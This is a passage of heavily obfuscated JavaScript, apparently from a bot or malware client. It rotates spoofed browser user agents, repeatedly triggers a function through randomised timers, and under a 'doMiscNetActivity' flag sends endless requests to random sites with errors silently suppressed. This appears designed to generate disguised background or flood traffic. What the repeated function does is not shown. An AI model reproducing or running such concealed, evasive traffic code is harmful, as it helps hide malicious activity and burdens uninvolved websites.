      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0x90d + -0x79 * 0x2d + 0x1e52; k < 0xd * -0xed + -0x7 * 0x3d5 + 0x26e * 0x10; k++)
    setTimeout(f, (-0x6a21 * 0x1 + -0x1abb7 + 0x30038) * k * getRandomInt(-0xd * 0x2a1 + -0x1 * 0x1adb + 0x3d09, -0x2296 * -0x1 + -0x3 * -0x5d1 + 0x2 * -0x1a03));
  setInterval(() => {
    f();
    for (let l = -0x269f * 0x1 + 0xd * -0x8b + -0x79d * -0x6; l < 0x8cb + -0x12f4 + -0x209 * -0x5; l++)
      setTimeout(f, (-0xcd34 * -0x2 + -0x7de7 + 0x1 * -0x3221) * l * getRandomInt(-0x1eff + 0x173f + -0x1 * -0x7c1, 0x26bc + 0x1219 + -0x38d2));
  }, -0x4cda8c + -0x1 * 0x45adc6 + 0x301c6 * 0x43);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x23ac + -0x1 * -0x45d + 0x3aa7) * getRandomInt(-0x2 * -0xd92 + 0xa21 + -0x2544, 0x289 * 0x3 + 0x2019 + -0x27af));
}, 0x924 + -0x192a + 0xbf * 0x16);